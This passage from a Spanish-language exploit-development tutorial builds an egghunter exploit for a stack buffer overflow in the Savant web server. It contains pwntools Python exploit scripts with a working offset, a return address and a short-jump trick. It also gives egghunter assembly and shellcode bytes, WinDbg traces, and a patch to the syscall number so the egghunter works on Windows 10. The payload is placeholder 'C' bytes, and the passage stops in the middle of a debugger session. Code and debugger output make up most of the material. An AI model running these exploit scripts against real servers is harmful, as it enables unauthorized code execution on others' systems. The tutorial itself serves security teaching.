0427ea9d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eaad  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eabd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eacd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eadd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eaed  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eafd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb0d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb1d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb2d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb3d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb4d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb5d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb6d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb7d  41 41 41 41 41 41 41 41-41 41 41 41 41 74 86 41  AAAAAAAAAAAAAt.A  </span>
</code></pre></div></div><br>

</section>

<section class="post" id="egg">
<br><h3 class="post-title">5.5 - EggHunter</h3><br>

<p class="plain-text">Lo primero que necesitamos para poder utilizar un egghunter es almacenar un <code class="language-plaintext highlighter-rouge">shellcode</code> de tamaño normal en alguna parte de la memoria, no importa si no conocemos la dirección, para poder encontrarlo facilmente enviaremos la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> antes de las <code class="language-plaintext highlighter-rouge">C's</code>, la pregunta es ¿donde lo enviamos? podemos reversear el programa para buscar un lugar o siguiendo la lógica si hacemos una petición podemos enviar una <code class="language-plaintext highlighter-rouge">data</code> y tal vez se guarde en algun lugar de la memoria</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

ret </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x00418674</span><span class="p">)

shellcode  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"w00tw00t"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">300</span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret

method  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor eax, eax"</span><span class="p">)
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jle $+0x17"</span><span class="p">)

content  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
content </span><span class="o">+= </span><span class="p">method </span><span class="o">+ </span><span class="no">b</span><span class="s">" /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="p">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">  
content </span><span class="o">+= </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit podemos buscar la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code>, en toda la memoria dentro del rango <code class="language-plaintext highlighter-rouge">user-mode</code>, nuestros bytes están en la dirección <code class="language-plaintext highlighter-rouge">0x047c8183</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">s -a 0 L?80000000 w00tw00t
047c8183  77 30 30 74 77 30 30 74-43 43 43 43 43 43 43 43  w00tw00tCCCCCCCC  

</span><span class="ro">0:000></span><span class="p"> db 0x047c8183
047c8183  77 30 30 74 77 30 30 74-43 43 43 43 43 43 43 43  w00tw00tCCCCCCCC  
047c8193  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
047c81a3  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
047c81b3  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
047c81c3  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
047c81d3  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
047c81e3  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
047c81f3  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  </span>
</code></pre></div></div><br>

<p class="plain-text">Esta dirección parece ser parte del <code class="language-plaintext highlighter-rouge">heap</code> por lo que es complicado hacer un stack pivot o encontrar una forma de calcular donde esta el shellcode, pero esta ahi</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!address 0x047c8183
                                     
Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  Heap
Base Address:           047c0000
End Address:            047d5000
Region Size:            00015000 (  84.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        047c0000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              heap owning the address: !heap -s -h 0x2210000
More info:              heap segment
More info:              heap entry containing the address: !heap -x 0x47c8183  

Content source: 1 (target), length: ce7d</span>
</code></pre></div></div><br>

<p class="plain-text">La utilidad mona integra un egghunter probablemente basado en el siguiente <a href="https://hick.org/code/skape/papers/egghunt-shellcode.pdf">paper</a>, sin embargo si lo ejecutamos este fallará, enseguida analizaremos el porque</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona egghunter
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py egghunter
[+] Egg set to w00t
[+] Generating traditional 32bit egghunter code
[+] Preparing output file 'egghunter.txt'
    - (Re)setting logfile C:\mona\egghunter.txt
[+] Egghunter  (33 bytes): 
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74" 
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"  </span>
</code></pre></div></div><br>

<p class="plain-text">Al desensamblar el <code class="language-plaintext highlighter-rouge">egghunter</code> podriamos ver algo asi, inicia obteniendo en <code class="language-plaintext highlighter-rouge">edx</code> la ultima dirección de la página y saltando a la siguiente incrementando el registro en una unidad, luego guarda el valor actual de edx en el <code class="language-plaintext highlighter-rouge">stack</code> para no perderlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">.</span><span class="na">page</span><span class="p">:
    </span><span class="o">or </span><span class="mi">dx</span><span class="p">, </span><span class="mi">0xfff</span><span class="c1">        ; get last address in page  
</span><span class="o">.</span><span class="na">find</span><span class="p">:
    </span><span class="o">inc </span><span class="mi">edx</span><span class="c1">             ; increase memory counter
    </span><span class="o">push </span><span class="mi">edx</span><span class="c1">            ; push value to stack</span>
</code></pre></div></div><br>

<p class="plain-text">Después mueve al registro eax el valor <code class="language-plaintext highlighter-rouge">0x2</code> que simboliza a la función <code class="language-plaintext highlighter-rouge">NtAccessCheckAndAuditAlarm</code> para despues ejecutar <code class="language-plaintext highlighter-rouge">int 0x2e</code> que cambia el modo de usuario a kernel generando asi una <code class="language-plaintext highlighter-rouge">syscall</code> que ejecutará la función, esta función la utiliza para evitar violaciones de acceso en tiempo de ejecución, de esta forma comprueba si la página donde apunta edx es válida antes de ejecutar más instrucciones</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    push </span><span class="mi">0x2</span><span class="c1">            ; push NtAccessCheckAndAuditAlarm
    </span><span class="o">pop </span><span class="mi">eax</span><span class="c1">             ; $eax = NtAccessCheckAndAuditAlarm  
    </span><span class="o">int </span><span class="mi">0x2e</span><span class="c1">            ; system call</span>
</code></pre></div></div><br>

<p class="plain-text">La llamada a esta función se usa para comprobar que la página sea válida evitando asi violaciones de acceso en siguientes instrucciones, cuando la página no es valida la función devuelve el valor en <code class="language-plaintext highlighter-rouge">eax</code> y si es <code class="language-plaintext highlighter-rouge">0xc0000005</code> nos indica que no existe</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    cmp </span><span class="mi">al</span><span class="p">, </span><span class="mi">0x5</span><span class="c1">         ; check ACCESS_VIOLATION (0xc0000005)  </span>
</code></pre></div></div><br>

<p class="plain-text">Después de eso restauramos el valor de <code class="language-plaintext highlighter-rouge">edx</code> que guardamos y si el valor devuelto es <code class="language-plaintext highlighter-rouge">0xc0000005</code> volvemos al inicio para aumentar la <code class="language-plaintext highlighter-rouge">página</code> hasta que sea valida</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    pop </span><span class="mi">edx</span><span class="c1">             ; restore edx
    </span><span class="o">jz .</span><span class="na">page</span><span class="c1">            ; if zf == 1 -> next page  </span>
</code></pre></div></div><br>

<p class="plain-text">Una vez que es válida guarda en <code class="language-plaintext highlighter-rouge">eax</code> la cadena <code class="language-plaintext highlighter-rouge">w00t</code> en hexadecimal y en <code class="language-plaintext highlighter-rouge">edi</code> la dirección que tiene actualmente <code class="language-plaintext highlighter-rouge">edx</code> para poder ser comparados mas adelante</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">0x74303077 </span><span class="c1">; $eax = "w00t"
    </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, </span><span class="mi">edx</span><span class="c1">        ; $edi = address  </span>
</code></pre></div></div><br>

<p class="plain-text">Luego de eso usa <code class="language-plaintext highlighter-rouge">scasd</code> para comparar si los bytes que se encuentran en <code class="language-plaintext highlighter-rouge">[edi]</code> sean iguales a la cadena <code class="language-plaintext highlighter-rouge">w00t</code>, esto lo hace 2 veces, ¿porque <code class="language-plaintext highlighter-rouge">w00tw00t</code> y no solo <code class="language-plaintext highlighter-rouge">w00t</code>? porque esos <code class="language-plaintext highlighter-rouge">4</code> bytes podrian aparecer varias veces dando asi falsos positivos, si la comparación no es igual aumenta la dirección en una unidad hasta que sea válida</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    scasd               </span><span class="c1">; cmp eax, [edi]
    </span><span class="o">jnz .</span><span class="na">find</span><span class="c1">           ; if zf == 0 -> loop  

    </span><span class="o">scasd</span><span class="c1">               ; cmp eax, [edi]
    </span><span class="o">jnz .</span><span class="na">find</span><span class="c1">           ; if zf == 0 -> loop  </span>
</code></pre></div></div><br>

<p class="plain-text">Cuando la comparación se haga 2 veces quiere decir que valido la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> enviada antes del <code class="language-plaintext highlighter-rouge">shellcode</code> y lo que esta despues es este por lo que salta ahi</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    jmp </span><span class="mi">edi</span><span class="c1">             ; if zf == 1 -> exec  </span>
</code></pre></div></div><br>

<p class="plain-text">El cógigo del <code class="language-plaintext highlighter-rouge">egghunter</code> se ve algo asi, lo podemos compilar con <code class="language-plaintext highlighter-rouge">nasm</code> y <code class="language-plaintext highlighter-rouge">ld</code>, para obtenerlo en el formato que necesitamos para python usaremos <code class="language-plaintext highlighter-rouge">objdump</code> y regex</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global </span><span class="na">_start

_start</span><span class="p">:
    </span><span class="o">.</span><span class="na">page</span><span class="p">:
        </span><span class="o">or </span><span class="mi">dx</span><span class="p">, </span><span class="mi">0xfff</span><span class="c1">        ; get last address in page

    </span><span class="o">.</span><span class="na">find</span><span class="p">:
        </span><span class="o">inc </span><span class="mi">edx</span><span class="c1">             ; increase memory counter
        </span><span class="o">push </span><span class="mi">edx</span><span class="c1">            ; push value to stack
        </span><span class="o">push </span><span class="mi">0x2</span><span class="c1">            ; push NtAccessCheckAndAuditAlarm
        </span><span class="o">pop </span><span class="mi">eax</span><span class="c1">             ; $eax = NtAccessCheckAndAuditAlarm

        </span><span class="o">int </span><span class="mi">0x2e</span><span class="c1">            ; system call
        </span><span class="o">cmp </span><span class="mi">al</span><span class="p">, </span><span class="mi">0x5</span><span class="c1">         ; check ACCESS_VIOLATION (0xc0000005)  

        </span><span class="o">pop </span><span class="mi">edx</span><span class="c1">             ; restore edx
        </span><span class="o">jz .</span><span class="na">page</span><span class="c1">            ; if zf == 1 -> next page

        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">0x74303077 </span><span class="c1">; $eax = "w00t"
        </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, </span><span class="mi">edx        </span><span class="c1">; $edi = address

        </span><span class="o">scasd               </span><span class="c1">; cmp eax, [edi]
        </span><span class="o">jnz .</span><span class="na">find           </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">scasd               </span><span class="c1">; cmp eax, [edi]
        </span><span class="o">jnz .</span><span class="na">find           </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">jmp </span><span class="mi">edi             </span><span class="c1">; if zf == 1 -> exec</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nasm </span><span class="p">-f elf egghunter.asm -o egghunter.o
</span><span class="ve">❯ ld </span><span class="p">egghunter.o -m elf_i386 -o egghunter

</span><span class="ve">❯ objdump </span><span class="p">-d egghunter | </span><span class="ve">grep </span><span class="am">'[0-9a-f]:'</span><span class="p"> | </span><span class="ve">grep</span><span class="p"> -v </span><span class="am">'egghunter' </span><span class="p">|</span><span class="ve"> cut </span><span class="p">-f2 -d: | </span><span class="ve">cut</span><span class="p"> -f1-6 -d</span><span class="am"> ' ' </span><span class="p">| </span><span class="ve">tr </span><span class="p">-s </span><span class="am">' ' </span><span class="p">| </span><span class="ve">tr </span><span class="am">'\t' ' ' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ $//g' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ /\\x/g'</span><span class="p"> | </span><span class="ve">paste </span><span class="p">-d </span><span class="am">'' </span><span class="p">-s  
\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7  </span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro exploit ahora se puede ver asi, al ejecutar el <code class="language-plaintext highlighter-rouge">pop eax; ret;</code> volverá al jmp corto que saltara al <code class="language-plaintext highlighter-rouge">egghunter</code> que buscara el shellcode que son <code class="language-plaintext highlighter-rouge">C's</code> en la memoria</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t" </span><span class="o">* </span><span class="mi">2</span><span class="p">
egghunter </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7</span><span class="s">"  </span><span class="p">

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(egghunter))

shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">300</span><span class="p">

ret </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x00418674</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">egghunter
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">ret

method </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor eax, eax"</span><span class="p">)
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jle $+0x17"</span><span class="p">)

content  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
content </span><span class="o">+= </span><span class="p">method </span><span class="o">+ </span><span class="no">b</span><span class="s">" /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">
content </span><span class="o">+= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Para ver su funcionamiento y porque falla enviamos el <code class="language-plaintext highlighter-rouge">exploit</code> y nos detenemos después del salto corto y justo antes de iniciar a ejecutar todo el <code class="language-plaintext highlighter-rouge">egghunter</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=77842990 esi=018f2aa8 edi=0041703c
eip=00418674 esp=0388ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
Savant+0x18674:
00418674 58              pop     eax

</span><span class="ro">0:000> </span><span class="p">p
eax=0388fe60 ebx=018f2aa8 ecx=0000000e edx=77842990 esi=018f2aa8 edi=0041703c
eip=00418675 esp=0388ea20 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
Savant+0x18675:
00418675 c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=0388fe60 ebx=018f2aa8 ecx=0000000e edx=77842990 esi=018f2aa8 edi=0041703c
eip=0388ea74 esp=0388ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
0388ea74 31c0            xor     eax,eax

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=77842990 esi=018f2aa8 edi=0041703c
eip=0388ea76 esp=0388ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0388ea76 7e15            jle     0388ea8d                                [br=1]  

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=77842990 esi=018f2aa8 edi=0041703c
eip=0388ea8d esp=0388ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0388ea8d 6681caff0f      or      dx,0FFFh</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora en el eip podemos ver el egghunter, ya que entendimos el funcionamiento establecemos el breakpoint en <code class="language-plaintext highlighter-rouge">0x0388eaab</code> antes de que salte al shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">u eip L10
0388ea8d 6681caff0f      or      dx,0FFFh
0388ea92 42              inc     edx
0388ea93 52              push    edx
0388ea94 6a02            push    2
0388ea96 58              pop     eax
0388ea97 cd2e            int     2Eh
0388ea99 3c05            cmp     al,5
0388ea9b 5a              pop     edx
0388ea9c 74ef            je      0388ea8d
0388ea9e b877303074      mov     eax,74303077h
0388eaa3 89d7            mov     edi,edx
0388eaa5 af              scas    dword ptr es:[edi]  
0388eaa6 75ea            jne     0388ea92
0388eaa8 af              scas    dword ptr es:[edi]  
0388eaa9 75e7            jne     0388ea92
0388eaab ffe7            jmp     edi

</span><span class="ro">0:000> </span><span class="p">bp 0x0388eaab

</span><span class="ro">0:000> </span><span class="p">g</span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo al ejecutarlo usa todos los recursos para buscar <code class="language-plaintext highlighter-rouge">w00tw00t</code> en toda la memoria pero por alguna razón extraña nunca lo hace aunque se encuentra ahi</p>
<a href="/exploitdevelopment/egghunters/1.png" target="_blank"><div><p><img src="/exploitdevelopment/egghunters/1.png"></p></div></a>

</section>

<section class="post" id="win10">
<br><h3 class="post-title">5.6 - EggHunter Win10</h3><br>

<p class="plain-text">¿Cual es el problema? hasta <code class="language-plaintext highlighter-rouge">Windows 8</code> la función <code class="language-plaintext highlighter-rouge">NtAccessCheckAndAuditAlarm</code> tuvo el mismo syscall NR que es <code class="language-plaintext highlighter-rouge">0x2</code> sin embargo en <code class="language-plaintext highlighter-rouge">Windows 10</code> este cambia constantemente con cada actualización, la solución es buscar el syscall NR especifico para tu version de Windows o aprovechando que estamos en <code class="language-plaintext highlighter-rouge">windbg</code> podemos verlo desde el modulo ntdll, para esta versión especifica de Windows es <code class="language-plaintext highlighter-rouge">0x1c9</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">u ntdll!NtAccessCheckAndAuditAlarm
ntdll!NtAccessCheckAndAuditAlarm:
778420c0 b8c9010000      mov     eax,1C9h
778420c5 e803000000      call    ntdll!NtAccessCheckAndAuditAlarm+0xd (778420cd)  
778420ca c22c00          ret     2Ch
778420cd 8bd4            mov     edx,esp
778420cf 0f34            sysenter
778420d1 c3              ret
778420d2 8da42400000000  lea     esp,[esp]
778420d9 8da42400000000  lea     esp,[esp]</span>
</code></pre></div></div><br>

<p class="plain-text">La solución es simple, cambiamos el syscall NR en eax de <code class="language-plaintext highlighter-rouge">0x2</code> a <code class="language-plaintext highlighter-rouge">0x1c9</code>, esto tenemos que hacerlo de una forma que evitemos los <code class="language-plaintext highlighter-rouge">null bytes</code> en el egghunter</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">push </span><span class="mi">0x2
</span><span class="o">pop </span><span class="mi">eax</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax
</span><span class="o">mov </span><span class="mi">ax</span><span class="p">, </span><span class="mi">0x1c9</span>
</code></pre></div></div><br>

<p class="plain-text">De forma opcional podemos setear el registro <code class="language-plaintext highlighter-rouge">edx</code> a 0 al inicio para partir desde la dirección <code class="language-plaintext highlighter-rouge">0x0</code>, esto puede reducir el tiempo de espera significativamente</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">xor </span><span class="mi">edx</span><span class="p">, </span><span class="mi">edx</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora el codigo del <code class="language-plaintext highlighter-rouge">egghunter</code> se ve de esta forma, aunque después de estas modificaciones el peso en <code class="language-plaintext highlighter-rouge">bytes</code> aumento un poco ahora deberia funcionar</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global </span><span class="na">_start

_start</span><span class="p">:
    </span><span class="o">xor </span><span class="mi">edx</span><span class="p">, </span><span class="mi">edx            </span><span class="c1">; $edx = 0x0

    </span><span class="o">.</span><span class="na">page</span><span class="p">:
        </span><span class="o">or </span><span class="mi">dx</span><span class="p">, </span><span class="mi">0xfff        </span><span class="c1">; get last address in page

    </span><span class="o">.</span><span class="na">find</span><span class="p">:
        </span><span class="o">inc </span><span class="mi">edx             </span><span class="c1">; increase memory counter
        </span><span class="o">push </span><span class="mi">edx            </span><span class="c1">; push value to stack
        </span><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax        </span><span class="c1">; $eax = 0x0
        </span><span class="o">mov </span><span class="mi">ax</span><span class="p">, </span><span class="mi">0x1c9       </span><span class="c1">; $eax = NtAccessCheckAndAuditAlarm

        </span><span class="o">int </span><span class="mi">0x2e            </span><span class="c1">; system call
        </span><span class="o">cmp </span><span class="mi">al</span><span class="p">, </span><span class="mi">0x5</span><span class="c1">         ; check ACCESS_VIOLATION (0xc0000005)  

        </span><span class="o">pop </span><span class="mi">edx             </span><span class="c1">; restore edx
        </span><span class="o">jz .</span><span class="na">page            </span><span class="c1">; if zf == 1 -> next page

        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">0x74303077 </span><span class="c1">; $eax = "w00t"
        </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, </span><span class="mi">edx        </span><span class="c1">; $edi = address

        </span><span class="o">scasd               </span><span class="c1">; cmp eax, [edi]
        </span><span class="o">jnz .</span><span class="na">find           </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">scasd               </span><span class="c1">; cmp eax, [edi]
        </span><span class="o">jnz .</span><span class="na">find           </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">jmp </span><span class="mi">edi             </span><span class="c1">; if zf == 1 -> exec</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ objdump </span><span class="p">-d egghunter | </span><span class="ve">grep </span><span class="am">'[0-9a-f]:'</span><span class="p"> | </span><span class="ve">grep</span><span class="p"> -v </span><span class="am">'egghunter' </span><span class="p">|</span><span class="ve"> cut </span><span class="p">-f2 -d: | </span><span class="ve">cut</span><span class="p"> -f1-6 -d</span><span class="am"> ' ' </span><span class="p">| </span><span class="ve">tr </span><span class="p">-s </span><span class="am">' ' </span><span class="p">| </span><span class="ve">tr </span><span class="am">'\t' ' ' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ $//g' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ /\\x/g'</span><span class="p"> | </span><span class="ve">paste </span><span class="p">-d </span><span class="am">'' </span><span class="p">-s  
\x31\xd2\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\xb8\xc9\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7</span>
</code></pre></div></div><br>

<p class="plain-text">Repasemos, modificamos el egghunter original para hacerlo funcionar en la ultima versión de <code class="language-plaintext highlighter-rouge">Windows 10</code>, ya que lo tenemos nos daremos un tiempo para entender como funciona viendo las instrucciones y comportamiento desde el debugger</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">u eip L11
01c8ea8d 31d2            xor     edx,edx
01c8ea8f 6681caff0f      or      dx,0FFFh
01c8ea94 42              inc     edx
01c8ea95 52              push    edx
01c8ea96 31c0            xor     eax,eax
01c8ea98 66b8c901        mov     ax,1C9h
01c8ea9c cd2e            int     2Eh
01c8ea9e 3c05            cmp     al,5
01c8eaa0 5a              pop     edx
01c8eaa1 74ea            je      01c8ea8f
01c8eaa3 b877303074      mov     eax,74303077h
01c8eaa8 89d7            mov     edi,edx
01c8eaaa af              scas    dword ptr es:[edi]  
01c8eaab 75e7            jne     01c8ea94
01c8eaad af              scas    dword ptr es:[edi]  
01c8eaae 75e4            jne     01c8ea94
01c8eab0 ffe7            jmp     edi</span>
</code></pre></div></div><br>

<p class="plain-text">El egghunter inicia seteando el registro <code class="language-plaintext highlighter-rouge">edx</code> en <code class="language-plaintext highlighter-rouge">0</code>, obtiene la ultima pagina e incrementa edx en una unidad, el valor final de edx es <code class="language-plaintext highlighter-rouge">0x1000</code>, y esta sera la cantidad que aumentara en cada vuelta hsata comprobar si la dirección es válida</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=77842990 esi=018f2aa8 edi=0041703c  
eip=01c8ea8d esp=01c8ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
01c8ea8d 31d2            xor     edx,edx

</span><span class="ro">0:000> </span><span class="p">p
